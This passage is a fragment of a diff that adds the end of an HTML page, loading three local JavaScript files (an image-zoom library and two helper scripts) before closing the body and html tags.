+        <script src="../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../js/opera.js"></script>
+      
+        <script src="../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
